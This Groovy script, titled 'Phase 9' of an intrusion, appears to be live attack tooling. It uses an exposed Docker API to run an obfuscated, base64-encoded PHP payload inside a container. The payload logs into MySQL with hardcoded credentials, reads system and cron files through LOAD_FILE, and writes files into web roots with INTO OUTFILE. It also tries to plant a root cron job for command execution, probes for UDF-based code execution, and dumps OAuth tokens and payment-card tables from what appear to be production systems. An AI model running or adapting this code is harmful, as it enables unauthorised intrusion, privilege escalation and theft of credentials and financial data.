// Phase 9: RCE via OUTFILE - find docroot + write shell + test connectivity to PROD
dockerApi = "http://172.27.140.148:4243"
containerId = "5b32e909c295"

def httpPost(String urlStr, String jsonBody) {
    def conn = (HttpURLConnection) new URL(urlStr).openConnection()
    conn.setRequestMethod("POST")
    conn.setDoOutput(true)
    conn.setConnectTimeout(10000)
    conn.setReadTimeout(120000)
    conn.setRequestProperty("Content-Type", "application/json")
    if (jsonBody != null) conn.getOutputStream().write(jsonBody.getBytes("UTF-8"))
    def code = conn.getResponseCode()
    def body = (code >= 400 ? conn.getErrorStream()?.getText("UTF-8") : conn.getInputStream().getText("UTF-8"))
    conn.disconnect()
    return [code: code, body: body]
}

def execIn(String cmd) {
    def createBody = '{"AttachStdout":true,"AttachStderr":true,"Tty":true,"Cmd":["/bin/bash","-c",' + groovy.json.JsonOutput.toJson(cmd) + ']}'
    def r1 = httpPost(dockerApi + "/containers/" + containerId + "/exec", createBody)
    if (r1.code != 201) { return "EXEC_CREATE_FAIL HTTP " + r1.code + ": " + r1.body }
    def execId = new groovy.json.JsonSlurper().parseText(r1.body).Id
    def r2 = httpPost(dockerApi + "/exec/" + execId + "/start", '{"Detach":false,"Tty":true}')
    return r2.body
}

def php = '''<?php
error_reporting(E_ALL);
ini_set("display_errors","1");

$m = new mysqli("172.27.141.4", "adaxxidb", "JTQ6PrkecY3y1kVN", "", 3306);
if ($m->connect_error) { die("FAIL: ".$m->connect_error."\\n"); }

echo "===== [1] READ WEB CONFIG FILES =====\\n";
$configs = array(
    "/etc/nginx/nginx.conf",
    "/etc/nginx/conf.d/default.conf",
    "/etc/nginx/sites-enabled/default",
    "/etc/httpd/conf/httpd.conf",
    "/etc/httpd/conf.d/ssl.conf",
    "/etc/httpd/conf.d/php.conf",
    "/opt/rh/httpd24/root/etc/httpd/conf/httpd.conf",
    "/var/www/html/index.php",
    "/var/www/html/index.html",
    "/usr/share/nginx/html/index.html",
    "/etc/crontab",
    "/var/spool/cron/root",
    "/var/spool/cron/mysql",
    "/etc/cron.d/mysql",
);
foreach ($configs as $f) {
    $r = $m->query("SELECT LOAD_FILE(\\'".$f."\\') AS c");
    if ($r) {
        $row = $r->fetch_assoc();
        if ($row["c"] !== null && strlen($row["c"]) > 0) {
            echo "\\n--- FILE_OK: $f (".strlen($row["c"])." bytes) ---\\n";
            $content = str_replace("\\x00", " ", $row["c"]);
            if (strlen($content) > 2000) $content = substr($content, 0, 2000)."\\n...[TRUNCATED]";
            echo $content."\\n";
        } else {
            echo "FILE_NULL|$f\\n";
        }
    }
}

echo "\\n===== [2] FIND WEB DOCUMENT ROOTS =====\\n";
// Common webroot paths to try writing
$webroots = array(
    "/var/www/html/",
    "/usr/share/nginx/html/",
    "/var/www/",
    "/home/apache/",
    "/opt/app/public/",
    "/srv/www/",
);
foreach ($webroots as $wr) {
    $testfile = $wr . "tr4ns_" . mt_rand(1000,9999) . ".txt";
    $r = $m->query("SELECT 'PIVOT_OK' INTO OUTFILE '".$testfile."'");
    if ($r) {
        echo "OUTFILE_OK|$testfile\\n";
    } else {
        $err = $m->error;
        if (strpos($err, "Can't create") !== false || strpos($err, "No such file") !== false) {
            echo "DIR_MISSING|$wr|$err\\n";
        } elseif (strpos($err, "already exists") !== false) {
            echo "FILE_EXISTS|$testfile\\n";
        } else {
            echo "OUTFILE_ERR|$wr|$err\\n";
        }
    }
}

echo "\\n===== [3] CRON RCE ATTEMPT =====\\n";
// Try writing to cron.d
$cron_payload = "* * * * * root /bin/bash -c 'id > /tmp/rce_proof.txt; cat /proc/net/tcp > /tmp/net_from_host.txt; ping -c1 172.27.141.24 > /tmp/prod_ping.txt 2>&1'\\n";
$cron_paths = array(
    "/etc/cron.d/tr4ns_test",
    "/var/spool/cron/root",
    "/var/spool/cron/crontabs/root",
);
foreach ($cron_paths as $cp) {
    // Use HEX encoding to avoid quoting issues
    $hex = "0x" . bin2hex($cron_payload);
    $r = $m->query("SELECT $hex INTO OUTFILE '".$cp."'");
    if ($r) {
        echo "CRON_WRITE_OK|$cp\\n";
    } else {
        echo "CRON_WRITE_FAIL|$cp|".$m->error."\\n";
    }
}

echo "\\n===== [4] ALTERNATIVE: UDF RCE =====\\n";
// Check if we can create a UDF for command execution
$r = $m->query("SELECT @@plugin_dir pd, @@secure_file_priv sfp, @@version_compile_os os");
$row = $r->fetch_assoc();
echo "PLUGIN_DIR=".$row["pd"]."\\n";
echo "SECURE_FILE_PRIV=|".$row["sfp"]."|\\n";
echo "OS=".$row["os"]."\\n";

// Check existing UDFs
$r = $m->query("SELECT * FROM mysql.func");
if ($r && $r->num_rows > 0) {
    while ($row = $r->fetch_assoc()) { echo "  UDF: ".implode("|",$row)."\\n"; }
} else { echo "  NO_UDF\\n"; }

// Try to write UDF shared object to plugin dir
echo "\\n--- UDF shared object write test ---\\n";
$r = $m->query("SELECT 'test' INTO OUTFILE '/usr/lib64/mysql/plugin/tr4ns_test.txt'");
if ($r) {
    echo "PLUGIN_DIR_WRITABLE=YES\\n";
    // Clean up
    $m->query("SELECT LOAD_FILE('/usr/lib64/mysql/plugin/tr4ns_test.txt')");
} else {
    echo "PLUGIN_DIR_WRITABLE=NO|".$m->error."\\n";
}

echo "\\n===== [5] DEV SEARS DB - sensitive tables dump =====\\n";
// Connect to DEV Sears for oauth tokens etc
$m2 = new mysqli("172.27.141.6", "apifincadodev", "1q2w3e4r5t6y", "tienda", 3308);
if (!$m2->connect_error) {
    // OAuth tokens
    $r = $m2->query("SELECT id, user_id, client_id, name, scopes, revoked, created_at, expires_at FROM tienda.oauth_access_tokens ORDER BY created_at DESC LIMIT 10");
    if ($r) {
        echo "--- oauth_access_tokens (latest 10) ---\\n";
        while ($row = $r->fetch_assoc()) { echo "  ".implode(" | ", $row)."\\n"; }
    } else { echo "oauth_tokens: ".$m2->error."\\n"; }

    // API users
    $r = $m2->query("SELECT * FROM tienda.peticiones_api LIMIT 5");
    if ($r && $r->num_rows > 0) {
        echo "\\n--- peticiones_api (sample) ---\\n";
        $fields = $r->fetch_fields(); $cols=array(); foreach($fields as $f) $cols[]=$f->name;
        echo implode("|", $cols)."\\n";
        while ($row = $r->fetch_row()) { echo implode("|", array_map(function($v){return substr($v??"",0,60);},$row))."\\n"; }
    }
    $m2->close();
}

// =====================================================
// 6. T1Pagos specific payment DB
// =====================================================
echo "\\n===== [6] SEARCH FOR payment_t1 DB =====\\n";
$r = $m->query("SHOW DATABASES LIKE '%payment%'");
if ($r && $r->num_rows > 0) { while ($row = $r->fetch_row()) { echo "  FOUND: $row[0]\\n"; } }
else { echo "  NOT_FOUND\\n"; }

$r = $m->query("SHOW DATABASES LIKE '%t1%'");
if ($r && $r->num_rows > 0) { while ($row = $r->fetch_row()) { echo "  FOUND: $row[0]\\n"; } }
else { echo "  NOT_FOUND\\n"; }

// Check vta.tag_prepaid (cards!)
echo "\\n--- vta.tag_prepaid (sample) ---\\n";
$r = $m->query("SELECT * FROM vta.tag_prepaid LIMIT 3");
if ($r && $r->num_rows > 0) {
    $fields = $r->fetch_fields(); $cols=array(); foreach($fields as $f) $cols[]=$f->name;
    echo implode("|", $cols)."\\n";
    while ($row = $r->fetch_row()) { echo implode("|", array_map(function($v){return substr($v??"",0,60);},$row))."\\n"; }
} else { echo "ERR: ".$m->error."\\n"; }

// DLA tarjetas
echo "\\n--- dla.tarjetas (sample) ---\\n";
$r = $m->query("SELECT * FROM dla.tarjetas LIMIT 3");
if ($r && $r->num_rows > 0) {
    $fields = $r->fetch_fields(); $cols=array(); foreach($fields as $f) $cols[]=$f->name;
    echo implode("|", $cols)."\\n";
    while ($row = $r->fetch_row()) { echo implode("|", array_map(function($v){return substr($v??"",0,60);},$row))."\\n"; }
} else { echo "ERR: ".$m->error."\\n"; }

$m->close();
echo "\\nPHASE9_COMPLETE\\n";
'''

def b64 = php.getBytes("UTF-8").encodeBase64().toString()
def cmd = "echo " + b64 + " | base64 -d > /tmp/_p9.php && php /tmp/_p9.php 2>&1; rm -f /tmp/_p9.php"

println "########## PHASE 9: RCE VIA OUTFILE ##########"
println execIn(cmd)
